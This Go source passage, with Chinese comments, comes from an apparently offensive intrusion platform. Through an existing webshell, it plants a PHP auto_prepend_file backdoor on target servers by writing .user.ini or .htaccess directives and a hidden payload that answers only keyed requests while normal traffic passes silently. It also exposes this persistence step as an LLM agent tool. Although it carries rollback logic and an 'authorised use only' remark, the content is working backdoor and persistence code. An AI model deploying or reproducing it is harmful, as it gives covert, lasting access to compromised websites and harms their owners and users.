	appendOut := runner(phpPersistAppendCommand(layout), 30*time.Second)
	if strings.Contains(appendOut.Output, phpPersistConfigExist) {
		phpPersistRemove(runner, layout, layout.PayloadPath, layout.BlockPath)
		return nil, phpPersistUserErr("配置中出现了并发写入的半持久化标记，已删除本次载荷，请刷新后重试")
	}
	if !strings.Contains(appendOut.Output, phpPersistConfigOK) {
		phpPersistRemove(runner, layout, layout.PayloadPath, layout.BlockPath)
		detail := strings.TrimSpace(appendOut.Note + "\n" + appendOut.Output)
		return nil, fmt.Errorf("写入 %s 失败：%s", configPath, displayOr(detail, "目标未返回成功标记"))
	}
	phpPersistRemove(runner, layout, layout.BlockPath)

	verifyTrace := runner(phpPersistVerifyCommand(layout), intranetVerifyTimeout)
	if !strings.Contains(verifyTrace.Output, intranetArtifactPresent) {
		rollback := runner(phpPersistRevokeCommand(layout), intranetPersistTimeout)
		detail := strings.TrimSpace(appendOut.Output + "\n" + verifyTrace.Output)
		return nil, fmt.Errorf("配置已写入但痕迹复核失败，已尝试回滚：%s（回滚输出：%s）",
			displayOr(detail, "无输出"), truncateIntranetOutput(strings.TrimSpace(rollback.Output+rollback.Note), 400))
	}

	wait := phpPersistWaitDuration(in.WaitSeconds, mode)
	verified, probeNote := s.phpPersistProbe(ctx, triggerURL, payload, wait)
	after := phpPersistHTTPStatus(ctx, triggerURL)
	if baseline > 0 && baseline < 500 && after >= 500 {
		rollback := runner(phpPersistRevokeCommand(layout), intranetPersistTimeout)
		rollbackVerify := runner(phpPersistVerifyCommand(layout), intranetVerifyTimeout)
		if !strings.Contains(rollbackVerify.Output, intranetArtifactGone) {
			art, regErr := s.phpPersistRegisterArtifact(pg, parent, taskID, host, layout, kind, fp, in, payload,
				"部署后站点返回 HTTP "+strconv.Itoa(after)+"，回滚未完成；"+truncateIntranetOutput(rollback.Output+rollback.Note, 800), info)
			if regErr != nil {
				warnings = append(warnings, "落地物登记失败，需立即手工清理："+regErr.Error())
			}
			res := &phpPersistResult{
				Artifact: art, Mode: mode, Directory: directory,
				PayloadPath: payloadPath, ConfigPath: configPath, TriggerURL: triggerURL,
				Info: info, Verified: false, Pending: false,
				CacheTTL: info.UserINICacheTTL, Warnings: warnings,
				Note: "站点在启用 prepend 后返回 5xx，且回滚未完成；" + phpPersistArtifactRef(art),
			}
			return res, fmt.Errorf("站点在启用 prepend 后返回 HTTP %d，回滚未完成，%s", after, phpPersistArtifactRef(art))
		}
		return nil, fmt.Errorf("站点在启用 prepend 后返回 HTTP %d，已回滚；请检查目标 PHP 版本/配置", after)
	}
	if !verified && mode == db.IntranetArtifactPHPHtaccess {
		rollback := runner(phpPersistRevokeCommand(layout), intranetPersistTimeout)
		rollbackVerify := runner(phpPersistVerifyCommand(layout), intranetVerifyTimeout)
		if !strings.Contains(rollbackVerify.Output, intranetArtifactGone) {
			art, regErr := s.phpPersistRegisterArtifact(pg, parent, taskID, host, layout, kind, fp, in, payload,
				"auto_prepend_file 未生效且回滚未完成；"+truncateIntranetOutput(rollback.Output+rollback.Note, 800), info)
			if regErr != nil {
				warnings = append(warnings, "落地物登记失败，需立即手工清理："+regErr.Error())
			}
			res := &phpPersistResult{
				Artifact: art, Mode: mode, Directory: directory,
				PayloadPath: payloadPath, ConfigPath: configPath, TriggerURL: triggerURL,
				Info: info, Verified: false, Pending: false,
				CacheTTL: info.UserINICacheTTL, Warnings: warnings,
				Note: "auto_prepend_file 未生效，且回滚未完成；" + phpPersistArtifactRef(art),
			}
			return res, fmt.Errorf("auto_prepend_file 未生效且回滚未完成，%s", phpPersistArtifactRef(art))
		}
		return nil, fmt.Errorf("auto_prepend_file 未生效（.htaccess 模式无缓存延迟），已回滚；请确认 AllowOverride 允许 php_value 且 PHP 以 mod_php/LiteSpeed 运行：%s", displayOr(probeNote, "未取得探测回执"))
	}
	pending := !verified && mode == db.IntranetArtifactPHPUserINI

	sealed, err := sealShellSecret(s.jwtKey, scanner.EncodeShellKey(key))
	if err != nil {
		phpPersistRemove(runner, layout, phpPersistCleanupFiles(layout)...)
		return nil, err
	}
	name := strings.TrimSpace(in.Name)
	if name == "" {
		name = "php-prepend-" + token
	}
	target := strings.TrimSpace(parent.Target)
	if target == "" {
		target = host
	}
	var taskPtr *int64
	if taskID > 0 {
		taskPtr = &taskID
	}
	note := "PHP 半持久化（" + mode + "）；父 webshell #" + strconv.FormatInt(parent.ID, 10) +
		"；配置 " + configPath + "；载荷 " + payloadPath
	shell, err := pg.CreateWebshell(db.WebshellInput{
		Name: name, URL: triggerURL, ShellType: "php", Protocol: scanner.ShellProtocolV2,
		Secret: sealed, Carrier: carrier, PayloadSHA256: payload.SHA256, KeyVersion: 1,
		Target: target, Source: "php_prepend", TaskID: taskPtr, Note: note,
	})
	if err != nil {
		rollback := runner(phpPersistRevokeCommand(layout), intranetPersistTimeout)
		rollbackVerify := runner(phpPersistVerifyCommand(layout), intranetVerifyTimeout)
		if !strings.Contains(rollbackVerify.Output, intranetArtifactGone) {
			art, regErr := s.phpPersistRegisterArtifact(pg, parent, taskID, host, layout, kind, fp, in, payload,
				"登记 webshell 失败且回滚未完成；"+truncateIntranetOutput(rollback.Output+rollback.Note, 800), info)
			if regErr != nil {
				warnings = append(warnings, "落地物登记失败，需立即手工清理："+regErr.Error())
			}
			res := &phpPersistResult{
				Artifact: art, Mode: mode, Directory: directory,
				PayloadPath: payloadPath, ConfigPath: configPath, TriggerURL: triggerURL,
				Info: info, Verified: verified, Pending: pending,
				CacheTTL: info.UserINICacheTTL, Warnings: warnings,
				Note: "持久化已生效但登记 webshell 失败，且回滚未完成；" + phpPersistArtifactRef(art),
			}
			return res, fmt.Errorf("登记 webshell 失败且回滚未完成，%s：%v", phpPersistArtifactRef(art), err)
		}
		return nil, fmt.Errorf("持久化已生效但登记 webshell 失败，已回滚：%w", err)
	}

	art, aerr := pg.AddIntranetArtifact(db.IntranetArtifactInput{
		TaskID: taskID, Host: host, Kind: kind, Name: name,
		Path:        configPath,
		Description: displayOr(strings.TrimSpace(in.Description), "PHP auto_prepend_file 半持久化（"+mode+"）"),
		DeployCommand: "# 由 jingwei php_semi_persist 通过 webshell #" + strconv.FormatInt(parent.ID, 10) +
			" 部署；载荷 " + payloadPath + "；配置块 " + layout.BeginMarker,
		RevokeCommand: phpPersistRevokeCommand(layout),
		VerifyCommand: phpPersistVerifyCommand(layout),
		Fingerprint:   fp,
		Evidence:      intranetArtifactEvidence("部署", appendOut, verifyTrace),
		ExpiresAt:     expiresAt,
		Metadata:      s.phpPersistArtifactMetadata(parent, shell, layout, payload, info),
	})
	if aerr != nil {
		_ = runner(phpPersistRevokeCommand(layout), intranetPersistTimeout)
		rollbackVerify := runner(phpPersistVerifyCommand(layout), intranetVerifyTimeout)
		if strings.Contains(rollbackVerify.Output, intranetArtifactGone) {
			// 这里不能只 append 到 warnings 再返回错误：warnings 只随成功结果下发，
			// 错误路径上会被丢弃，清理失败的原因就再也看不到了。直接并进错误文本。
			if _, derr := pg.DeleteWebshell(shell.ID); derr != nil {
				return nil, fmt.Errorf("登记落地物台账失败，已回滚，但清理 webshell 记录（#%d）失败：%s；根因：%w",
					shell.ID, derr.Error(), aerr)
			}
			return nil, fmt.Errorf("登记落地物台账失败，已回滚：%w", aerr)
		}
		// 回滚失败时保留 webshell 记录，至少还能通过它执行清理。
		return nil, fmt.Errorf("登记落地物台账失败，且回滚未完成（webshell #%d 保留）：%w", shell.ID, aerr)
	}

	s.registerWebshellResource(shell, triggerURL, "")

	res := &phpPersistResult{
		Webshell: shell, Artifact: art, Mode: mode, Directory: directory,
		PayloadPath: payloadPath, ConfigPath: configPath, TriggerURL: triggerURL,
		Info: info, Verified: verified, Pending: pending,
		CacheTTL: info.UserINICacheTTL, Warnings: warnings,
	}
	switch {
	case verified:
		res.Note = "半持久化已生效；新 webshell 记录可直接执行命令/轮换密钥，普通请求会静默放行"
	case pending:
		res.Note = fmt.Sprintf("配置已写入，但 PHP 的 user_ini.cache_ttl≈%d 秒内可能仍使用旧配置；请稍后在 webshell 列表点“检查”确认，确认有效前不要依赖该通道",
			info.UserINICacheTTL)
	default:
		res.Note = "配置与载荷已写入，但探测未确认生效：" + displayOr(probeNote, "无回执")
	}
	return res, nil
}

func phpPersistMarker(mode, token string, begin bool) string {
	comment := ";"
	if mode == db.IntranetArtifactPHPHtaccess {
		comment = "#"
	}
	edge := "begin"
	if !begin {
		edge = "end"
	}
	return comment + " jw:prepend:" + token + ":" + edge
}

func phpPersistInspect(run intranetCommandRunner, layout phpPersistLayout) (exists, hasMarker, hasPrepend bool) {
	out := run(phpPersistInspectCommand(layout), 20*time.Second)
	text := out.Output
	return strings.Contains(text, phpPersistConfigHas),
		strings.Contains(text, phpPersistConfigMark),
		strings.Contains(text, phpPersistConfigPre)
}

func phpPersistRemove(run intranetCommandRunner, layout phpPersistLayout, paths ...string) {
	if len(paths) == 0 {
		return
	}
	if layout.OSKind == intranetOSWindows {
		quoted := []string{}
		for _, p := range paths {
			if q, _, ok := intranetWindowsPath(p); ok {
				quoted = append(quoted, q)
			}
		}
		if len(quoted) > 0 {
			_ = run("del /f /q "+strings.Join(quoted, " ")+" >nul 2>&1", 15*time.Second)
		}
		return
	}
	quoted := make([]string, 0, len(paths))
	for _, p := range paths {
		quoted = append(quoted, shQuote(p))
	}
	_ = run("rm -f "+strings.Join(quoted, " "), 15*time.Second)
}

func phpPersistArtifactRef(art *db.IntranetArtifact) string {
	if art == nil || art.ID <= 0 {
		return "落地物台账登记失败，需人工按 payload/config 路径清理"
	}
	return "已登记落地物 #" + strconv.FormatInt(art.ID, 10) + " 供撤离清理"
}

func (s *Server) phpPersistRegisterArtifact(pg *db.DB, parent *db.Webshell, taskID int64, host string, layout phpPersistLayout, kind, fingerprint string, in phpPersistInput, payload scanner.ShellPayload, evidence string, info scanner.ShellInfo) (*db.IntranetArtifact, error) {
	art, err := pg.AddIntranetArtifact(db.IntranetArtifactInput{
		TaskID: taskID, Host: host, Kind: kind, Name: displayOr(strings.TrimSpace(in.Name), "PHP 半持久化"), Path: layout.ConfigPath,
		Description:   "部署失败后保留的可撤销痕迹（" + layout.Mode + "）",
		RevokeCommand: phpPersistRevokeCommand(layout),
		VerifyCommand: phpPersistVerifyCommand(layout),
		Fingerprint:   fingerprint,
		Evidence:      truncateIntranetOutput(evidence, 4000),
		Metadata:      s.phpPersistArtifactMetadata(parent, nil, layout, payload, info),
	})
	if err != nil {
		return nil, err
	}
	return art, nil
}

func (s *Server) phpPersistArtifactMetadata(parent, shell *db.Webshell, layout phpPersistLayout, payload scanner.ShellPayload, info scanner.ShellInfo) map[string]any {
	meta := map[string]any{
		"mode":               layout.Mode,
		"directory":          layout.Directory,
		"payload_path":       layout.PayloadPath,
		"config_path":        layout.ConfigPath,
		"config_name":        layout.ConfigName,
		"config_existed":     layout.ConfigExisted,
		"block_path":         layout.BlockPath,
		"trigger_url":        layout.TriggerURL,
		"token":              layout.Token,
		"begin_marker":       layout.BeginMarker,
		"end_marker":         layout.EndMarker,
		"parent_webshell_id": parent.ID,
		"os":                 layout.OSKind,
		"build":              layout.Build,
		"tmp_dir":            layout.TmpDir,
		"sapi":               info.SAPI,
		"server":             truncateText(info.ServerSoftware, 200),
		"user_ini_cache_ttl": info.UserINICacheTTL,
	}
	if payload.SHA256 != "" {
		meta["payload_sha256"] = payload.SHA256
	}
	if shell != nil {
		meta["webshell_id"] = shell.ID
	}
	return meta
}

// ---------------------------------------------------------------------------
// HTTP API
// ---------------------------------------------------------------------------

func (s *Server) phpSemiPersistWebshell(w http.ResponseWriter, r *http.Request) {
	id, ok := pathInt(r, "id")
	if !ok {
		writeErr(w, 400, "无效的 webshell ID")
		return
	}
	r.Body = http.MaxBytesReader(w, r.Body, 1<<20)
	var req phpPersistInput
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求格式错误")
		return
	}
	pg := s.pg(w)
	if pg == nil {
		return
	}
	res, err := s.deployPHPSemiPersist(r.Context(), pg, id, req)
	if err != nil {
		code := 502
		var ue phpPersistUserError
		switch {
		case errors.Is(err, errPHPPersistParentNotFound):
			code = 404
		case errors.As(err, &ue):
			code = 400
		}
		body := map[string]any{"error": err.Error()}
		if res != nil {
			body["result"] = res
		}
		writeJSON(w, code, body)
		return
	}
	writeJSON(w, 200, map[string]any{"result": res})
}

// ---------------------------------------------------------------------------
// LLM 工具
// ---------------------------------------------------------------------------

func (s *Server) toolPHPSemiPersist() actool.CoreTool {
	return wrTool("php_semi_persist",
		"把 PHP v2 webshell 升级为半持久化通道：上传一个只响应加密协议的 prepend 载荷，并在目标目录写入 .user.ini（PHP-FPM/CGI，受 user_ini.cache_ttl 延迟）或 .htaccess（Apache mod_php/LiteSpeed）的 auto_prepend_file 配置。普通业务请求会静默放行，只有携带正确密钥的请求被应答。部署成功后新增 source=php_prepend 的 webshell 记录（地址为 trigger_url），并登记可撤销落地物（session 为空，撤销时自动回退到父子 webshell）。这是真实持久化操作：只在授权范围内使用；不能从已有的半持久化 shell 再部署；删除父/子 webshell 前必须先撤销落地物。",
		objSchema(map[string]any{
			"webshell_id":  intranetIntParam("父 PHP 加密 v2 webshell ID（必填）"),
			"mode":         strParam("user_ini / htaccess / auto（可选，默认按 SAPI 自动选择）"),
			"directory":    strParam("目标目录（可选，默认 webshell 的 __DIR__）"),
			"filename":     strParam("载荷文件名（可选，默认随机 .jw<hex>.php）"),
			"config_name":  strParam("配置文件名（可选，默认 .user.ini / .htaccess）"),
			"trigger_url":  strParam("触发 URL（可选，默认父 webshell 地址；必须是同协议同主机的 PHP 脚本）"),
			"wait_seconds": intranetIntParam("部署后探测等待秒数（可选，默认 8/3，最大 120）"),
			"force":        map[string]any{"type": "boolean", "description": "覆盖目标已有的 auto_prepend_file 配置（可选，默认 false）"},
			"ttl_seconds":  intranetIntParam("落地物自动撤销 TTL 秒数（可选，60-2592000）"),
			"name":         strParam("新 webshell/落地物名称（可选）"),
			"description":  strParam("备注（可选）"),
		}, "webshell_id"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				WebshellID  int64  `json:"webshell_id"`
				Mode        string `json:"mode"`
				Directory   string `json:"directory"`
				Filename    string `json:"filename"`
				ConfigName  string `json:"config_name"`
				TriggerURL  string `json:"trigger_url"`
				WaitSeconds int    `json:"wait_seconds"`
				Force       bool   `json:"force"`
				TTLSeconds  int64  `json:"ttl_seconds"`
				Name        string `json:"name"`
				Description string `json:"description"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数格式错误"), nil
			}
			if a.WebshellID <= 0 {
				return actool.Errorf("webshell_id 必填"), nil
			}
			pg, err := s.intranetToolPG()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			res, derr := s.deployPHPSemiPersist(ctx, pg, a.WebshellID, phpPersistInput{
				Mode: a.Mode, Directory: a.Directory, Filename: a.Filename, ConfigName: a.ConfigName,
				TriggerURL: a.TriggerURL, WaitSeconds: a.WaitSeconds, Force: a.Force,
				Name: a.Name, Description: a.Description, TTLSeconds: a.TTLSeconds,
			})
			out := map[string]any{"result": res}
			if derr != nil {
				out["error"] = derr.Error()
			}
			return jsonResult(out)
		})
}
